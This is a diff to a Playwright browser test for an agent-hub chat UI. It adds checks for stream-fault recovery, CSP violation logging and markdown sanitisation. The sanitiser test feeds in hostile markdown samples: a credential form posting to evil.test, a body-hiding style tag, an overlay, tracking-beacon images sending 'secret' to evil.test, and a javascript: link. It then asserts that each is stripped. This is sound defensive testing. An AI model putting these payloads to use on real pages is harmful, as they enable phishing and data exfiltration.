@@ -4,7 +4,7 @@
 //   npm run build && node tests/network-ui.mjs        (HEADED=1 to watch)
 import { spawn } from "node:child_process";
 import { createServer } from "node:net";
-import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
+import { cpSync, mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { randomBytes } from "node:crypto";
@@ -13,8 +13,17 @@ import { createRequire } from "node:module";
 const require = createRequire(import.meta.url);
 const { chromium, expect } = require("@playwright/test");
 const app = resolve(import.meta.dirname, "..");
-const backendDir = resolve(app, "../dpi-backend");
 const tmp = mkdtempSync(join(tmpdir(), "dpi-net-ui-"));
+// Evidence lives under the run's temp dir; it is copied into the repo only when the run fails.
+const evidence = join(tmp, "evidence");
+mkdirSync(evidence, { recursive: true });
+const keepEvidence = () => {
+  const kept = resolve(app, "../../artifacts/verification", `network-ui-${Date.now()}`, "ui-evidence");
+  mkdirSync(kept, { recursive: true });
+  cpSync(evidence, kept, { recursive: true });
+  return kept;
+};
+const backendDir = resolve(app, "../dpi-backend");
 const work = join(tmp, "work");
 mkdirSync(join(work, "project-alpha"), { recursive: true });
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
@@ -102,8 +111,65 @@ await waitHttp(`${base}/api/network`);
 
 const browser = await chromium.launch({ channel: "chrome", headless: !process.env.HEADED });
 const context = await browser.newContext({ viewport: { width: 1600, height: 1000 } });
+// Inject only an external SSE peer event; the real store, models and UI remain intact.
+await context.addInitScript(() => {
+  const NativeSource = window.EventSource;
+  window.EventSource = class extends NativeSource {
+    constructor(...args) {
+      super(...args);
+      if (new URL(args[0], location.href).pathname !== "/api/stream") return;
+      window.__reviewMux = this;
+      this.addEventListener("message", (event) => {
+        const message = JSON.parse(event.data);
+        if (message.frame.type === "snapshot") {
+          window.__reviewAgentSub = message.sub;
+          if (window.__reviewHoldSnapshot) {
+            window.__reviewHeldSnapshot = event.data;
+            event.stopImmediatePropagation();
+          }
+        }
+      });
+    }
+  };
+});
+// CSP check: the hub serves the shell with style-src 'self' (no 'unsafe-inline'), so inline style
+// attributes anywhere in the shipped UI are silently dropped and reported here as violations.
+// The record lives in sessionStorage so it survives reloads within the tab and names the element.
+await context.addInitScript(() => {
+  const KEY = "__cspViolations";
+  const read = () => {
+    try { return JSON.parse(sessionStorage.getItem(KEY) ?? "[]"); } catch { return []; }
+  };
+  document.addEventListener("securitypolicyviolation", (event) => {
+    const list = read();
+    list.push({
+      directive: event.violatedDirective,
+      blockedURI: event.blockedURI,
+      sample: event.sample,
+      element: event.element?.outerHTML?.slice(0, 160) ?? "",
+      source: `${event.sourceFile ?? ""}:${event.lineNumber ?? 0}:${event.columnNumber ?? 0}`,
+    });
+    try { sessionStorage.setItem(KEY, JSON.stringify(list)); } catch {}
+  });
+});
 const errors = [];
-const watch = (p) => p.on("pageerror", (e) => errors.push(e.message));
+const cspConsole = [];
+const cspViolations = [];
+const collectCsp = async (p) => {
+  try {
+    cspViolations.push(
+      ...(await p.evaluate(() => {
+        try { return JSON.parse(sessionStorage.getItem("__cspViolations") ?? "[]"); } catch { return []; }
+      })),
+    );
+  } catch {}
+};
+const watch = (p) => {
+  p.on("pageerror", (e) => errors.push(e.message));
+  p.on("console", (m) => {
+    if (/Content Security Policy/i.test(m.text())) cspConsole.push(m.text());
+  });
+};
 let page = await context.newPage();
 watch(page);
 const pass = (msg) => console.log(`PASS ${msg}`);
@@ -162,6 +228,42 @@ try {
 
   await send("hello there");
   await expect(chat().locator(".markdown").filter({ hasText: "Echo: hello there" })).toBeVisible();
+  await page.evaluate(() => {
+    window.__reviewMux.dispatchEvent(new MessageEvent("message", { data: JSON.stringify({
+      sub: window.__reviewAgentSub,
+      frame: { type: "fault", error: { code: "unavailable", message: "Review fixture: subscription failed after snapshot" } },
+    }) }));
+  });
+  const stale = page.getByRole("alert").filter({ hasText: "subscription failed after snapshot" });
+  await expect(stale).toBeVisible();
+  await expect(stale).toContainText(/stale/i);
+  await expect(chat().locator(".markdown").filter({ hasText: "Echo: hello there" })).toBeVisible();
+  await composer().fill("keep this draft until the stream recovers");
+  await expect(page.getByRole("button", { name: "Send message", exact: true })).toBeDisabled();
+  const mutations = [];
+  const recordSend = (request) => {
+    if (request.method() === "POST" && new URL(request.url()).pathname.endsWith("/messages")) mutations.push(request.url());
+  };
+  page.on("request", recordSend);
+  await composer().press("Enter");
+  await expect(composer()).toHaveValue("keep this draft until the stream recovers");
+  expect(mutations).toEqual([]);
+  await page.evaluate(() => { window.__reviewHoldSnapshot = true; });
+  await stale.getByRole("button", { name: "Retry stream", exact: true }).click();
+  await expect.poll(() => page.evaluate(() => !!window.__reviewHeldSnapshot)).toBe(true);
+  await expect(stale).toBeVisible();
+  await expect(page.getByRole("button", { name: "Send message", exact: true })).toBeDisabled();
+  await page.evaluate(() => {
+    window.__reviewHoldSnapshot = false;
+    window.__reviewMux.dispatchEvent(new MessageEvent("message", { data: window.__reviewHeldSnapshot }));
+  });
+  await expect(stale).toHaveCount(0, { timeout: 10000 });
+  await expect(page.getByRole("button", { name: "Send message", exact: true })).toBeEnabled();
+  await expect(composer()).toHaveValue("keep this draft until the stream recovers");
+  await expect(chat().locator(".markdown").filter({ hasText: "Echo: hello there" })).toBeVisible();
+  page.off("request", recordSend);
+  await composer().fill("");
+  pass("R09 late stream fault stays visible, preserves transcript/draft, blocks Enter and retries a fresh snapshot");
   await send("!echo TOOL_OK");
   await expect(chat().locator(".tool-call").filter({ hasText: "bash" }).last()).toContainText(
     "Done",
@@ -169,6 +271,109 @@ try {
   );
   await expect(chat().getByText("Tool finished: TOOL_OK")).toBeVisible();
   pass("streamed turns: text reply and a bash tool round");
+
+  // GA-01: device-written markdown can never link back into the hub, and a browser
+  // navigation to a device-proxy path is refused instead of rendering a device document.
+  await send(
+    `links: [rel](/api/devices/box-b/v1/device) [self](${base}/api/network) [ext](https://example.org/x) ` +
+      `[js](javascript:alert(1)) <a href="/api/network">raw</a>`,
+  );
+  const linked = chat().locator(".markdown").filter({ hasText: "Echo: links:" });
+  await expect(linked).toBeVisible();
+  const anchors = await linked
+    .locator("a")
+    .evaluateAll((els) =>
+      els.map((a) => ({ text: a.textContent, href: a.getAttribute("href"), target: a.getAttribute("target"), rel: a.getAttribute("rel") })),
+    );
+  expect(anchors.map((a) => a.text).sort()).toEqual(["ext", "js", "raw", "rel", "self"]);
+  expect(anchors.filter((a) => a.href !== null)).toEqual([
+    { text: "ext", href: "https://example.org/x", target: "_blank", rel: "noopener noreferrer" },
+  ]);
+  const lure = await context.newPage();
+  const navigated = await lure.goto(`${base}/api/devices/box-b/v1/device`);
+  expect(navigated.status()).toBe(403);
+  expect(await lure.content()).not.toContain('"apiVersion"');
+  await collectCsp(lure);
+  await lure.close();
+  pass("GA-01: transcript links cannot point at the hub; a document navigation to the device proxy is 403");
+
+  // FE-M: transcript markdown is attacker-influenced and rendered in the admin origin, so only
+  // the markdown subset may reach the DOM: no forms, styles, overlays, remote images or ids.
+  {
+    const beacons = [];
+    const watchBeacons = (request) => {
+      if (new URL(request.url()).hostname === "evil.test") beacons.push(request.url());
+    };
+    page.on("request", watchBeacons);
+    const pixel =
+      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+    await send(
+      [
+        "hostile-md",
+        "",
+        `<form action="https://evil.test/x"><input name=pw><button>Go</button></form>`,
+        "",
+        "<style>body{display:none}</style>",
+        "",
+        `<div style="position:fixed;inset:0" class="modal" id="x">overlay</div>`,
+        "",
+        `beacon: <img src="https://evil.test/t.png?d=secret" alt="tracked"> ![md](https://evil.test/m.png) ![dot](${pixel})`,
+        "",
+        `<a href="https://evil.test/">ok</a>`,
+        "",
+        `<input type="text" value="phish">`,
+        "",
+        "- [x] done",
+        "",
+        "| a | b |",
+        "|:-:|--|",
+        "| 1 | 2 |",
+        "",
+        "```ts",
+        "const answer = 42;",
+        "```",
+      ].join("\n"),
+    );
+    const hostile = chat().locator(".markdown").filter({ hasText: "Echo: hostile-md" });
+    await expect(hostile).toBeAttached();
+    await expect(hostile.locator("pre code")).toBeAttached();
+    const found = await hostile.evaluate((root) => {
+      const all = [...root.querySelectorAll("*")];
+      return {
+        active: root.querySelectorAll("form,button,style,select,textarea,svg,script,iframe,object,embed,math").length,
+        forbiddenAttrs: all.flatMap((n) => [...n.attributes].map((a) => `${n.localName}[${a.name}]`)).filter((a) =>
+          /\[(style|id|name|action|formaction)\]$|\[(on|data-|aria-)/.test(a)),
+        inputs: [...root.querySelectorAll("input")].map((i) => [...i.attributes].map((a) => a.name).sort().join()),
+        align: root.querySelector("th")?.getAttribute("align"),
+        classes: all.filter((n) => n.hasAttribute("class")).map((n) => `${n.localName}.${n.getAttribute("class")}`),
+        images: root.querySelectorAll("img").length,
+        imageSources: [...root.querySelectorAll("img")].map((i) => i.getAttribute("src")),
+        text: root.textContent,
+        anchors: [...root.querySelectorAll("a")].map((a) => ({
+          text: a.textContent, href: a.getAttribute("href"), target: a.getAttribute("target"), rel: a.getAttribute("rel"),
+        })),
+        bodyShown: getComputedStyle(document.body).display !== "none",
+        pageIdHit: document.getElementById("x") !== null,
+      };
+    });
+    expect(found.active).toBe(0);
+    expect(found.forbiddenAttrs).toEqual([]);
+    expect(found.inputs).toEqual(["checked,disabled,type"]);
+    expect(found.align).toBe("center");
+    expect(found.classes).toEqual(["code.language-ts"]);
+    expect(found.imageSources).toEqual([pixel]);
+    expect(found.text).toContain("tracked");
+    expect(found.text).not.toContain("secret");
+    expect(found.anchors).toEqual([
+      { text: "ok", href: "https://evil.test/", target: "_blank", rel: "noopener noreferrer" },
+    ]);
+    expect(found.bodyShown).toBe(true);
+    expect(found.pageIdHit).toBe(false);
+    await sleep(500);
+    expect(beacons).toEqual([]);
+    page.off("request", watchBeacons);
+    pass("FE-M: hostile transcript markdown keeps only the markdown subset (no form/style/overlay/remote image)");
+  }
 
   // Busy: queue + withdraw, reject-if-busy, steer, Escape interrupt.
   await send("!sleep 6");
@@ -424,6 +629,7 @@ try {
   await expect(
     second.getByTestId("chat").locator(".markdown").filter({ hasText: "Echo: from tab one" }),
   ).toBeVisible();
+  await collectCsp(second);
   await second.close();
   pass("two tabs on the same agent both stream");
 
@@ -494,8 +700,17 @@ try {
   expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
   await page.getByRole("button", { name: "Toggle network" }).click();
   await expect(page.locator(".network-sidebar.open")).toBeVisible();
-  await page.screenshot({ path: "/tmp/dpi-net-mobile.png" });
-  pass("narrow viewport: drawer tree, no horizontal overflow");
+  const panels = page.getByRole("navigation", { name: "Panels", exact: true });
+  await panels.getByRole("button", { name: "Details", exact: true }).click();
+  await expect(page.locator(".network-sidebar.open")).toHaveCount(0);
+  await expect(page.locator(".inspector.overlay")).toBeVisible();
+  await panels.getByRole("button", { name: "Network", exact: true }).click();
+  await expect(page.locator(".inspector.overlay")).toHaveCount(0);
+  await expect(page.locator(".network-sidebar.open")).toBeVisible();
+  await page.screenshot({ path: join(evidence, "mobile.png") });
+  await panels.getByRole("button", { name: "Chat", exact: true }).click();
+  await expect(page.locator(".network-sidebar.open, .inspector.overlay")).toHaveCount(0);
+  pass("R04 narrow viewport: Network/Details never overlap, Chat closes both, no horizontal overflow");
 
   // Archive the session from the tree.
   await page.setViewportSize({ width: 1600, height: 1000 });
@@ -508,11 +723,23 @@ try {
   });
   pass("archive session");
 
+  // CSP: report every violation and prove the shipped UI itself is clean. Vue `:style` OBJECT bindings
+  // go through the CSSOM (allowed by style-src; custom properties set via setProperty merely reflect
+  // into the style attribute), so a violation whose `element` is set means the app shipped an inline
+  // style. The only expected events carry no element: they fire INSIDE dompurify while it parses the
+  // hostile-markdown fixture (its <style> and style= never survive into the page — asserted by the
+  // FE-M block above).
+  await collectCsp(page);
+  for (const v of cspViolations)
+    console.log(`CSP ${v.element ? "VIOLATION" : "sanitizer-parse"} ${v.directive} blocked=${v.blockedURI} el=${v.element} at ${v.source}`);
+  for (const c of cspConsole) console.log(`CSP CONSOLE ${c}`);
+  expect(cspViolations.filter((v) => v.element)).toEqual([]);
   expect(errors).toEqual([]);
-  pass("no browser runtime errors");
+  pass("no browser runtime errors, no CSP violations from the app's own markup");
   console.log("ALL NETWORK UI CHECKS PASSED");
 } catch (e) {
-  await page.screenshot({ path: "/tmp/dpi-net-failure.png" }).catch(() => {});
+  await page.screenshot({ path: join(evidence, "failure.png") }).catch(() => {});
+  console.error(`UI evidence: ${keepEvidence()}`);
   console.error("hub log:\n" + hub.log().slice(-3000));
   throw e;
 } finally {
